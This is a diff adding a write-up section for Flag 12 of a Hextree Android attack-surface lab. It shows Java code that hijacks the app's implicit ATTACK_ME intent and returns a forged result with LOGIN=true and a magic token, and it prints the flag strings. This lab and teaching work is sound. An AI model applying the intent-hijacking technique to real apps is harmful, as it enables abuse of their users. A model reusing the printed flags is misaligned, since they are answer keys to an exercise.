@@ -979,6 +979,65 @@ HXT{sent-back-result-1897djh}
 **Flag:** `HXT{sent-back-result-1897djh}`
 
 
+# Flag 12 — Careful Intent Conditions
+
+I opened `Flag12Activity` in **JADX** and checked how the activity handles the result from the implicit intent.
+
+The activity sends:
+
+```java
+Intent intent = new Intent("io.hextree.attacksurface.ATTACK_ME");
+startActivityForResult(intent, 42);
+```
+
+So I created an exported `Attack_Receiver_Activity` with an intent filter for the same `ATTACK_ME` action.
+
+While checking `onActivityResult()`, I found that there were **two conditions** required for success.
+
+First, the original Intent used to launch Flag 12 must contain:
+
+```java
+getIntent().getBooleanExtra("LOGIN", false)
+```
+
+with the value `true`.
+
+So I launched Flag 12 using:
+
+```java
+Intent intent = new Intent();
+
+intent.setClassName(
+        "io.hextree.attacksurface",
+        "io.hextree.attacksurface.activities.Flag12Activity"
+);
+
+intent.putExtra("LOGIN", true);
+
+startActivity(intent);
+```
+
+The second condition was:
+
+```java
+intent.getIntExtra("token", -1) == 1094795585
+```
+
+So I made my `Attack_Receiver_Activity` return an Intent containing the required token:
+
+```java
+Intent result = new Intent();
+result.putExtra("token", 1094795585);
+
+setResult(Activity.RESULT_OK, result);
+finish();
+```
+
+After Flag 12 received the result, both `LOGIN=true` and `token=1094795585` were satisfied, and the flag was displayed.
+
+**Flag:** `HXT{tricky-intent-condition-bjhs782}`
+
+
 # Broadcast Receivers
 
 # Flag 16 — Basic Exposed Receiver
